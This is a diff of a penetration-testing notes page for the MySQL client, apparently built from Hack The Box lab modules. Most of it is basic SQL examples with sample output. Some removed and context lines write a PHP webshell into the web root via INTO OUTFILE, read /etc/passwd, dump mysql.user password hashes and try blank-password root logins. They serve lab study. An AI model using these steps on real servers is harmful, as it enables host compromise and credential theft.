@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/mysql.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Connect and identify the current database account
+[Search this tool’s saved examples](/commands/notebook?tool=mysql) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Connect and identify the current database account
 
 **Run in:** Kali, then the MySQL prompt. **Requires:** Reachable MySQL/MariaDB and a valid database account; enter the SQL statements inside its prompt.
 
@@ -24,125 +32,9 @@ SELECT USER(), CURRENT_USER();
 SHOW DATABASES;
 ```
 
-**Read the result:** Identify version, current database, effective user and grants before selecting schemas, tables and columns.
-
-**If Login works but a database is absent or denied:** SQL access, FILE privilege, server filesystem access and OS execution are separate capabilities; avoid assuming a remote DB shares the web host's filesystem.
+**What the result establishes:** Identify version, current database, effective user and grants before selecting schemas, tables and columns.
 
 **Next check:** Inspect accessible schemas and object grants; database access does not establish filesystem or OS privileges.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://dev.mysql.com/doc/refman/8.4/en/mysql.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## mysql: choose the operation and read the result
-
-Connect to MySQL/MariaDB and query databases.
-
-### What the result establishes
-
-Identify version, current database, effective user and grants before selecting schemas, tables and columns.
-
-### Prerequisites and common failures
-
-SQL access, FILE privilege, server filesystem access and OS execution are separate capabilities; avoid assuming a remote DB shares the web host's filesystem.
-
-### Example 1: Commands
-
-Run in: **Kali / MySQL prompt**.
-
-```bash
-mysql -h TARGET_IP -u USER -p
-# Inside mysql
-SHOW DATABASES;
-USE DATABASE_NAME;
-SHOW TABLES;
-```
-
-### Example 2: Footprinting & scanning
-
-Run in: **Saved lab example**.
-
-```bash
-sudo nmap <IP> -sV -sC -p3306 --script mysql*
-```
-
-Saved context: [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Footprinting & scanning
-
-Run in: **Saved lab example**.
-
-```bash
-mysql -u root -h <IP>      # try a blank-password root login directly
-```
-
-Saved context: [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Connecting & interacting
-
-Run in: **Saved lab example**.
-
-```bash
-mysql -u <user> -p<password> -h <IP>     # NOTE: no space between -p and the password
-mysql -u root   -h <IP>                  # prompt-less attempt (blank password)
-```
-
-Saved context: [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: From DB access to the filesystem (and RCE)
-
-Run in: **Saved lab example**.
-
-```sql
--- Check whether file operations are allowed and where they're confined
-SHOW VARIABLES LIKE 'secure_file_priv';
-
--- Read an arbitrary local file as the MySQL service account
-SELECT LOAD_FILE('/etc/passwd');
-
--- Write a PHP webshell into the web root → browse to it for RCE
-SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
-```
-
-Saved context: [MySQL and MariaDB Enumeration — From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#from-db-access-to-the-filesystem-and-rce). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: SQL Syntax
-
-Run in: **Saved lab example**.
-
-```bash
-mysql> USE htbusers;
-```
-
-Saved context: [Common Services: Full Module Reference — SQL Syntax](/modules/common-services/full-reference#sql-syntax). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: Select a Database
-
-Run in: **Saved lab example**.
-
-```text
-mysql> USE htbusers;
-
-Database changed
-```
-
-Saved context: [Attacking SQL Databases: Module Notes — Select a Database](/modules/common-services/sql#select-a-database). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Connect to MySQL/MariaDB and query databases.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=mysql) · [All tools](/index)
 
 ## Commands
 
@@ -156,18 +48,15 @@ USE DATABASE_NAME;
 SHOW TABLES;
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+## If it fails
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Example 1: Commands](/enumeration/mysql-mariadb-cheat-sheet#example-1-commands)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+| Symptom | Check |
+| --- | --- |
+| Login works but a database is absent or denied | SQL access, FILE privilege, server filesystem access and OS execution are separate capabilities; avoid assuming a remote DB shares the web host's filesystem. |
 
 ## Notebook recipes
 
-31 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+69 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -240,7 +129,7 @@ Database changed
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Example 7: Select a Database](/enumeration/mysql-mariadb-cheat-sheet#example-7-select-a-database) · [Attacking SQL Databases: Module Notes — Select a Database](/modules/common-services/sql#select-a-database)
+**Original note sections:** [Attacking SQL Databases: Module Notes — Select a Database](/modules/common-services/sql#select-a-database)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -468,7 +357,7 @@ mysql> USE htbusers;
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Example 6: SQL Syntax](/enumeration/mysql-mariadb-cheat-sheet#example-6-sql-syntax) · [Common Services: Full Module Reference — SQL Syntax](/modules/common-services/full-reference#sql-syntax)
+**Original note sections:** [Common Services: Full Module Reference — SQL Syntax](/modules/common-services/full-reference#sql-syntax)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -580,81 +469,6 @@ mysql -u root   -h <IP>                  # prompt-less attempt (blank password)
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Example 4: Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#example-4-connecting-&-interacting) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**MySQL and MariaDB Enumeration**
-
-Context from the notebook: USE &lt;db>; Switch into a database
-
-```text
-USE <db>;
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**MySQL and MariaDB Enumeration**
-
-Context from the notebook: SHOW TABLES; List tables in the current database
-
-```text
-SHOW TABLES;
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**MySQL and MariaDB Enumeration**
-
-Context from the notebook: SELECT * FROM &lt;table>; Dump a table's rows
-
-```text
-SELECT * FROM <table>;
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**MySQL and MariaDB Enumeration**
-
-Context from the notebook: SELECT version(); Server version → maps to CVEs
-
-```text
-SELECT version();
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**MySQL and MariaDB Enumeration**
-
-Context from the notebook: SELECT user, authentication_string FROM mysql.user; Dump usernames + password hashes  (needs privileges)
-
-```text
-SELECT user, authentication_string FROM mysql.user;
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
 **Original note sections:** [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
 
 {/* VAULT_ORIGINAL_LINK_END */}
@@ -674,7 +488,7 @@ sudo nmap <IP> -sV -sC -p3306 --script mysql*
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Example 2: Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#example-2-footprinting-&-scanning) · [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning)
+**Original note sections:** [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -687,7 +501,7 @@ mysql -u root -h <IP>      # try a blank-password root login directly
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Example 3: Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#example-3-footprinting-&-scanning) · [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning)
+**Original note sections:** [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -713,7 +527,7 @@ SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Example 5: From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#example-5-from-db-access-to-the-filesystem-and-rce) · [MySQL and MariaDB Enumeration — From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#from-db-access-to-the-filesystem-and-rce)
+**Original note sections:** [MySQL and MariaDB Enumeration — From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#from-db-access-to-the-filesystem-and-rce)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -763,78 +577,1188 @@ SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 
 </Accordion>
 
-<Accordion title="Default system databases">
+<Accordion title="SNMP and databases">
 
-### Default system databases
+### SNMP and databases
 
-**MySQL and MariaDB Enumeration**
+**Recon & Services: Enumeration Methodology**
 
-Context from the notebook: The data  you  want is in the non-default databases —  SHOW DATABASES;  and look past the four above. ( mysql.user  is the exception: it's a system table but holds the password hashes you'll want to dump.)
+```bash
+# Use a community string known or explicitly being tested in the lab.
+snmpwalk -v2c -c LAB_COMMUNITY "$TARGET_IP" 1.3.6.1.2.1.1
 
-```text
-SHOW DATABASES;
+# Interactive database access with a supplied identity.
+mysql -h "$TARGET_IP" -P 3306 -u student -p
+impacket-mssqlclient 'LAB/student@10.129.10.10' -windows-auth
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Default system databases](/enumeration/mysql-mariadb-cheat-sheet#default-system-databases) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+**Original note sections:** [Recon & Services: Enumeration Methodology — SNMP and databases](/enumeration/methodology#snmp-and-databases)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Why a database login can become host compromise">
+<Accordion title="ALTER Statement">
 
-### Why a database login can become host compromise
+### ALTER Statement
 
-**MySQL and MariaDB Enumeration**
-
-Context from the notebook: Write files  to disk ( INTO OUTFILE ), e.g. dropping a PHP webshell into the web root for instant RCE.
+**SQL Injection Fundamentals — HTB Module**
 
 ```text
-INTO OUTFILE
+mysql> ALTER TABLE logins ADD newColumn INT;
+
+Query OK, 0 rows affected (0.01 sec)
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Why a database login can become host compromise](/enumeration/mysql-mariadb-cheat-sheet#why-a-database-login-can-become-host-compromise) · [MySQL and MariaDB Enumeration — From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#from-db-access-to-the-filesystem-and-rce) · [MySQL and MariaDB Enumeration — Key Takeaways](/enumeration/mysql-mariadb-cheat-sheet#key-takeaways) · [SQL Injection — Prove write access before assuming execution](/web/sqli#prove-write-access-before-assuming-execution)
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — ALTER Statement](/web/htb/sql-injection-fundamentals#alter-statement)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**MySQL and MariaDB Enumeration**
-
-Context from the notebook: The setting that gates file read/write is  secure_file_priv : if it's empty, file operations can target  any  path (dangerous); if it points to a folder, they're confined to it; if it's  NULL , they're disabled. Checking this value ( SHOW VARIABLES LIKE 'secure_file_priv'; ) tells you immediately whether the file-based attacks below are on the table.
+**SQL Injection Fundamentals — HTB Module**
 
 ```text
-SHOW VARIABLES LIKE 'secure_file_priv';
+mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
+
+Query OK, 0 rows affected (0.01 sec)
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Why a database login can become host compromise](/enumeration/mysql-mariadb-cheat-sheet#why-a-database-login-can-become-host-compromise) · [Common Services: Personal Assessment Notes — Phase 3 — Writing a Webshell to the Correct Location via SQL](/modules/common-services/assessment#phase-3-—-writing-a-webshell-to-the-correct-location-via-sql) · [SQL Injection — File access is a separate privilege check](/web/sqli#file-access-is-a-separate-privilege-check) · [SQL Injection Fundamentals — HTB Module — Write File Privileges](/web/htb/sql-injection-fundamentals#write-file-privileges)
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — ALTER Statement](/web/htb/sql-injection-fundamentals#alter-statement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> ALTER TABLE logins MODIFY newerColumn DATE;
+
+Query OK, 0 rows affected (0.01 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — ALTER Statement](/web/htb/sql-injection-fundamentals#alter-statement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> ALTER TABLE logins DROP newerColumn;
+
+Query OK, 0 rows affected (0.01 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — ALTER Statement](/web/htb/sql-injection-fundamentals#alter-statement)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Database Protocols">
+<Accordion title="AND Operator">
 
-### Database Protocols
+### AND Operator
 
-**Ports, Protocols, and Services by Purpose**
-
-Context from the notebook: MySQL 3306 mysql -u &lt;user> -p&lt;pass> -h &lt;IP>
+**SQL Injection Fundamentals — HTB Module**
 
 ```text
-mysql -u <user> -p<pass> -h <IP>
+mysql> SELECT 1 = 1 AND 'test' = 'test';
+
++---------------------------+
+| 1 = 1 AND 'test' = 'test' |
++---------------------------+
+|                         1 |
++---------------------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT 1 = 1 AND 'test' = 'abc';
+
++--------------------------+
+| 1 = 1 AND 'test' = 'abc' |
++--------------------------+
+|                        0 |
++--------------------------+
+1 row in set (0.00 sec)
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Ports, Protocols, and Services by Purpose — Database Protocols](/reference/master-protocol-service-quick-reference#database-protocols)
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — AND Operator](/web/htb/sql-injection-fundamentals#and-operator)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Command Line">
+
+### Command Line
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+grcic550@htb[/htb]$ mysql -u root -p
+
+Enter password: <password>
+...SNIP...
+
+mysql>
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Command Line](/web/htb/sql-injection-fundamentals#command-line)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+grcic550@htb[/htb]$ mysql -u root -p<password>
+
+...SNIP...
+
+mysql>
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Command Line](/web/htb/sql-injection-fundamentals#command-line)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+grcic550@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p 
+
+Enter password: 
+...SNIP...
+
+mysql>
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Command Line](/web/htb/sql-injection-fundamentals#command-line)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Comments">
+
+### Comments
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT username FROM logins; -- Selects usernames from the logins table 
+
++---------------+
+| username      |
++---------------+
+| admin         |
+| administrator |
+| john          |
+| tom           |
++---------------+
+4 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Comments](/web/htb/sql-injection-fundamentals#comments)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
+
++----+----------+----------+---------------------+
+| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+
+|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
++----+----------+----------+---------------------+
+1 row in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Comments](/web/htb/sql-injection-fundamentals#comments)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Creating a database">
+
+### Creating a database
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> CREATE DATABASE users;
+
+Query OK, 1 row affected (0.02 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Creating a database](/web/htb/sql-injection-fundamentals#creating-a-database)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SHOW DATABASES;
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| users              |
++--------------------+
+
+mysql> USE users;
+
+Database changed
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Creating a database](/web/htb/sql-injection-fundamentals#creating-a-database)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="DROP Statement">
+
+### DROP Statement
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> DROP TABLE logins;
+
+Query OK, 0 rows affected (0.01 sec)
+
+
+mysql> SHOW TABLES;
+
+Empty set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — DROP Statement](/web/htb/sql-injection-fundamentals#drop-statement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Even Columns">
+
+### Even Columns
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT city FROM ports UNION SELECT * FROM ships;
+
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Even Columns](/web/htb/sql-injection-fundamentals#even-columns)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="INSERT Statement">
+
+### INSERT Statement
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
+
+Query OK, 1 row affected (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — INSERT Statement](/web/htb/sql-injection-fundamentals#insert-statement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
+
+Query OK, 1 row affected (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — INSERT Statement](/web/htb/sql-injection-fundamentals#insert-statement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
+
+Query OK, 2 rows affected (0.00 sec)
+Records: 2  Duplicates: 0  Warnings: 0
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — INSERT Statement](/web/htb/sql-injection-fundamentals#insert-statement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="LIKE Clause">
+
+### LIKE Clause
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins WHERE username LIKE 'admin%';
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
++----+---------------+------------+---------------------+
+2 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — LIKE Clause](/web/htb/sql-injection-fundamentals#like-clause)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins WHERE username like '___';
+
++----+----------+----------+---------------------+
+| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+
+|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
++----+----------+----------+---------------------+
+1 row in set (0.01 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — LIKE Clause](/web/htb/sql-injection-fundamentals#like-clause)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="LIMIT results">
+
+### LIMIT results
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins LIMIT 2;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
++----+---------------+------------+---------------------+
+2 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — LIMIT results](/web/htb/sql-injection-fundamentals#limit-results)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins LIMIT 1, 2;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
++----+---------------+------------+---------------------+
+2 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — LIMIT results](/web/htb/sql-injection-fundamentals#limit-results)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Multiple Operator Precedence">
+
+### Multiple Operator Precedence
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> select * from logins where username != 'tom' AND id > 3 - 2;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  2 | administrator | adm1n_p@ss | 2020-07-03 12:03:53 |
+|  3 | john          | john123!   | 2020-07-03 12:03:57 |
++----+---------------+------------+---------------------+
+2 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Multiple Operator Precedence](/web/htb/sql-injection-fundamentals#multiple-operator-precedence)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="NOT Operator">
+
+### NOT Operator
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT NOT 1 = 1;
+
++-----------+
+| NOT 1 = 1 |
++-----------+
+|         0 |
++-----------+
+1 row in set (0.00 sec)
+
+mysql> SELECT NOT 1 = 2;
+
++-----------+
+| NOT 1 = 2 |
++-----------+
+|         1 |
++-----------+
+1 row in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — NOT Operator](/web/htb/sql-injection-fundamentals#not-operator)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="OR Operator">
+
+### OR Operator
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT 1 = 1 OR 'test' = 'abc';
+
++-------------------------+
+| 1 = 1 OR 'test' = 'abc' |
++-------------------------+
+|                       1 |
++-------------------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT 1 = 2 OR 'test' = 'abc';
+
++-------------------------+
+| 1 = 2 OR 'test' = 'abc' |
++-------------------------+
+|                       0 |
++-------------------------+
+1 row in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — OR Operator](/web/htb/sql-injection-fundamentals#or-operator)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Operators in queries">
+
+### Operators in queries
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins WHERE username != 'john';
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
++----+---------------+------------+---------------------+
+3 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Operators in queries](/web/htb/sql-injection-fundamentals#operators-in-queries)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
++----+---------------+------------+---------------------+
+2 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Operators in queries](/web/htb/sql-injection-fundamentals#operators-in-queries)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="SCHEMATA">
+
+### SCHEMATA
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
